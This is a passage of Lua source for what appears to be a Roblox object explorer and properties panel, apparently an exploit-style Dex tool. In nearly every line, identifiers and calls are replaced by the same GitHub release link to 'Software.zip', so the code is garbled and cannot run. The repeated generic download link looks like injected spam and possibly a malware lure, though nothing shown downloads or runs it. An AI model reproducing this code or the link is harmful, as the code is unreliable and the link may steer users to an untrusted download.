			local fw = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			while true do
				local processed = false
				local c = 0
				for _,node in next,nodes do
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						local delInd
						for i = 1,#node do
							if node[i].Del then
								delInd = i
								break
							end
						end
						if delInd then
							for i = delInd+1,#node do
								local cn = node[i]
								if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
									node[delInd] = cn
									delInd = delInd+1
								end
							end
							for i = delInd,#node do
								node[i] = nil
							end
						end
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
						processed = true
						fw()
					end
					c = c + 1
					if c > 10000 then
						c = 0
						fw()
					end
				end
				if processed and not refreshDebounce then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
				fw(0.5)
			end
		end)()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local holder = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local isa = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local clone = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if not holder then
			holder = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("ScreenGui")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "ExplorerSelections"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(holder)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = holder
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}

			local guiTemplate = create({
				{1,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,100,0,100),}},
				{2,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.04313725605607,0.35294118523598,0.68627452850342),BorderSizePixel=0,Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-1,0,-1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,2,0,1),}},
				{3,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.04313725605607,0.35294118523598,0.68627452850342),BorderSizePixel=0,Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-1,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,2,0,1),}},
				{4,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.04313725605607,0.35294118523598,0.68627452850342),BorderSizePixel=0,Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-1,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,1,0),}},
				{5,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.04313725605607,0.35294118523598,0.68627452850342),BorderSizePixel=0,Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,1,0),}},
			})
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = guiTemplate

			local boxTemplate = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("SelectionBox")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.03
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0, 170, 255)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = boxTemplate
		end
		holder:ClearAllChildren()

		-- Updates theme
		for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()) do
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0, 170, 255)
		end

		local attachCons = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		for i = 1,#attachCons do
			attachCons[i].Destroy()
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(attachCons)

		local partEnabled = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local guiEnabled = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if not partEnabled and not guiEnabled then return end

		local svg = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local svb = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local attachTo = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local count = 1
		local boxCount = 0
		local workspaceNode = nodes[workspace]
		for i = 1,#sList do
			if boxCount > 1000 then break end
			local node = sList[i]
			local obj = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			if node ~= workspaceNode then
				if isa(obj,"GuiObject") and guiEnabled then
					local newVisual = clone(svg)
					attachCons[count] = attachTo(newVisual,{Target = obj, Resize = true})
					count = count + 1
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = holder
					boxCount = boxCount + 1
				elseif isa(obj,"PVInstance") and partEnabled then
					local newBox = clone(svb)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = obj
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = holder
					boxCount = boxCount + 1
				end
			end
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip",16,16)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		clipboard = {}

		selection = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = selection

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = setmetatable({},{__mode = "k"})
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = setmetatable({},{__mode = "k"})
		expanded = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Nil Instances"
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true

		local explorerItems = create({
			{1,"Folder",{Name="ExplorerItems",}},
			{2,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20392157137394,0.20392157137394,0.20392157137394),BorderSizePixel=0,Name="ToolBar",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,22),}},
			{3,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.1176470592618,0.1176470592618,0.1176470592618),BorderSizePixel=0,Name="SearchFrame",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-6,0,18),}},
			{4,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Name="SearchBox",Parent={3},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.39215689897537,0.39215689897537,0.39215689897537),PlaceholderText="Search workspace",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-24,0,18),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextXAlignment=0,}},
			{5,"UICorner",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2),Parent={3},}},
			{6,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Reset",Parent={3},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-17,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,}},
			{7,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5034718129",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.39215686917305,0.39215686917305,0.39215686917305),Parent={6},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
			{8,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Refresh",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-20,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,18,0,18),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,Visible=false,}},
			{9,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5642310344",Parent={8},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,12,0,12),}},
			{10,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Name="ScrollCorner",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,1,-16),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),Visible=false,}},
			{11,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,ClipsDescendants=true,Name="List",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,23),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,-23),}},
		})

		toolBar = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		treeFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = toolBar
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = treeFrame

		scrollV = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 3
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,23)
		scrollV:SetScrollFrame(treeFrame)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)

		scrollH = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(true)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 5
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,1,-16)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)

		local window = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = window
		window:SetTitle("Explorer")
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,22)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		-- Init stuff that requires the window
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)

		-- Window events
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("AbsoluteSize"):Connect(function()
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false end)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false end)

		-- Settings
		autoUpdateSearch = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip


		-- Fill in nodes
		nodes[game["Run Service"].Parent] = {Obj = game["Run Service"].Parent}
		expanded[nodes[game["Run Service"].Parent]] = true

		-- Nil Instances
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			nodes[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = nilNode
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

		local insts = getDescendants(game["Run Service"].Parent)
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			for i = 1,#insts do
				local obj = insts[i]
				local par = nodes[ffa(obj,"Instance")]
				if not par then continue end
				local newNode = {
					Obj = obj,
					Parent = par,
				}
				nodes[obj] = newNode
				par[#par+1] = newNode
			end
		else
			for i = 1,#insts do
				local obj = insts[i]
				local s,parObj = pcall(ffa,obj,"Instance")
				local par = nodes[parObj]
				if not par then continue end
				local newNode = {
					Obj = obj,
					Parent = par,
				}
				nodes[obj] = newNode
				par[#par+1] = newNode
			end
		end
	end

	return Explorer
end

return {InitDeps = initDeps, InitAfterMain = initAfterMain, Main = main}
end,
Properties = function()
--[[
	Properties App Module
	
	The main properties interface
]]

-- Common Locals
local Main,Lib,Apps,Settings -- Main Containers
local Explorer, Properties, ScriptViewer, Notebook -- Major Apps
local API,RMD,env,service,plr,create,createSimple -- Main Locals

local function initDeps(data)
	Main = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Lib = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Apps = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Settings = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

	API = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	RMD = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	env = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	service = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	plr = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	create = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	createSimple = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
end

local function initAfterMain()
	Explorer = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Properties = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	ScriptViewer = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Notebook = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
end

local function main()
	local Properties = {}

	local window, toolBar, propsFrame
	local scrollV, scrollH
	local categoryOrder
	local props,viewList,expanded,indexableProps,propEntries,autoUpdateObjs = {},{},{},{},{},{}
	local inputBox,inputTextBox,inputProp
	local checkboxes,propCons = {},{}
	local table,string = table,string
	local getPropChangedSignal = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	local getAttributeChangedSignal = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	local isa = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	local getAttribute = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	local setAttribute = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 100
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 16
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 4
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ""

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {Category = "Attributes", Class = "", Name = "", SpecialRow = "AddAttribute", Tags = {}}
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {Category = "Data", ValueType = {Name = "SoundPlayer"}, Class = "Sound", Name = "Preview", Tags = {}}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {
		["DataModel"] = {
			["PrivateServerId"] = true,
			["PrivateServerOwnerId"] = true,
			["VIPServerId"] = true,
			["VIPServerOwnerId"] = true
		}
	}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {
		["Vector2"] = true,
		["Vector3"] = true,
		["UDim"] = true,
		["UDim2"] = true,
		["CFrame"] = true,
		["Rect"] = true,
		["PhysicalProperties"] = true,
		["Ray"] = true,
		["NumberRange"] = true,
		["Faces"] = true,
		["Axes"] = true,
	}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {
		["https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"] = true
	}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {
		["Surface Inputs"] = true,
		["Surface"] = true
	}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {
		["Vector2"] = {"X","Y"},
		["Vector3"] = {"X","Y","Z"},
		["UDim"] = {"Scale","Offset"},
		["UDim2"] = {"X","https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip","https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip","Y","https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip","https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"},
		["CFrame"] = {"Position","Position.X","Position.Y","Position.Z",
			"RightVector","RightVector.X","RightVector.Y","RightVector.Z",
			"UpVector","UpVector.X","UpVector.Y","UpVector.Z",
			"LookVector","LookVector.X","LookVector.Y","LookVector.Z"},
		["Rect"] = {"Min.X","Min.Y","Max.X","Max.Y"},
		["PhysicalProperties"] = {"Density","Elasticity","ElasticityWeight","Friction","FrictionWeight"},
		["Ray"] = {"Origin","Origin.X","Origin.Y","Origin.Z","Direction","Direction.X","Direction.Y","Direction.Z"},
		["NumberRange"] = {"Min","Max"},
		["Faces"] = {"Back","Bottom","Front","Left","Right","Top"},
		["Axes"] = {"X","Y","Z"}
	}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {
		["BasePart"] = {
			["ResizableFaces"] = true
		}
	}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {
		["float"] = true,
		["double"] = true,
		["Color3"] = true,
		["UDim"] = true,
		["UDim2"] = true,
		["Vector2"] = true,
		["Vector3"] = true,
		["NumberRange"] = true,
		["Rect"] = true,
		["NumberSequence"] = true,
		["ColorSequence"] = true,
		["Ray"] = true,
		["CFrame"] = true
	}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {
		["number"] = "double",
		["boolean"] = "bool"
	}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {
		["int"] = true,
		["int64"] = true,
		["float"] = true,
		["double"] = true
	}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {
		string = "",
		bool = false,
		double = 0,
		UDim = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0),
		UDim2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0),
		BrickColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Medium stone grey"),
		Color3 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),
		Vector2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0),
		Vector3 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),
		NumberSequence = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1),
		ColorSequence = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1)),
		NumberRange = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0),
		Rect = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0)
	}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {"string","boolean","number","UDim","UDim2","BrickColor","Color3","Vector2","Vector3","NumberSequence","ColorSequence","NumberRange","Rect"}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop,str)
		local typeData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local typeName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		if typeName == "string" or typeName == "Content" then
			return str
		elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[typeName] then
			return tonumber(str)
		elseif typeName == "Vector2" then
			local vals = str:split(",")
			local x,y = tonumber(vals[1]),tonumber(vals[2])
			if x and y and #vals >= 2 then return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(x,y) end
		elseif typeName == "Vector3" then
			local vals = str:split(",")
			local x,y,z = tonumber(vals[1]),tonumber(vals[2]),tonumber(vals[3])
			if x and y and z and #vals >= 3 then return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(x,y,z) end
		elseif typeName == "UDim" then
			local vals = str:split(",")
			local scale,offset = tonumber(vals[1]),tonumber(vals[2])
			if scale and offset and #vals >= 2 then return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(scale,offset) end
		elseif typeName == "UDim2" then
			local vals = str:gsub("[{}]",""):split(",")
			local xScale,xOffset,yScale,yOffset = tonumber(vals[1]),tonumber(vals[2]),tonumber(vals[3]),tonumber(vals[4])
			if xScale and xOffset and yScale and yOffset and #vals >= 4 then return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(xScale,xOffset,yScale,yOffset) end
		elseif typeName == "CFrame" then
			local vals = str:split(",")
			local s,result = pcall(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,unpack(vals))
			if s and #vals >= 12 then return result end
		elseif typeName == "Rect" then
			local vals = str:split(",")
			local s,result = pcall(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,unpack(vals))
			if s and #vals >= 4 then return result end
		elseif typeName == "Ray" then
			local vals = str:gsub("[{}]",""):split(",")
			local s,origin = pcall(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,unpack(vals,1,3))
			local s2,direction = pcall(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,unpack(vals,4,6))
			if s and s2 and #vals >= 6 then return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(origin,direction) end
		elseif typeName == "NumberRange" then
			local vals = str:split(",")
			local s,result = pcall(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,unpack(vals))
			if s and #vals >= 1 then return result end
		elseif typeName == "Color3" then
			local vals = str:gsub("[{}]",""):split(",")
			local s,result = pcall(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,unpack(vals))
			if s and #vals >= 3 then return result end
		end

		return nil
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop,val)
		local typeData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local typeName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		if typeName == "Color3" then
			return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(val)
		elseif typeName == "NumberRange" then
			return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip", "https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end

		return tostring(val)
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(obj,classData)
		if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			if not pcall(function() return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end) then return nil end
		end

		local ignoreProps = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] or {}

		local result = {}
		local count = 1
		local props = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		for i = 1,#props do
			local prop = props[i]
			if not ignoreProps[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] then
				local s = pcall(function() return obj[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] end)
				if s then
					result[count] = prop
					count = count + 1
				end
			end
		end

		return result
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(class)
		local classList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[class] or {}
		if classList and #classList > 0 then
			return classList[1]
		end

		return nil
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(p)
		local maxConflictCheck = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local classLists = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local stringSplit = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local t_clear = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local conflictIgnore = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local conflictMap = {}
		local propList = p and {p} or props

		if p then
			local gName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			autoUpdateObjs[gName] = nil
			local subProps = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] or {}
			for i = 1,#subProps do
				autoUpdateObjs[gName.."."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[i]] = nil
			end
		else
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(autoUpdateObjs)
		end

		if #sList > 0 then
			for i = 1,#propList do
				local prop = propList[i]
				local propName,propClass = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
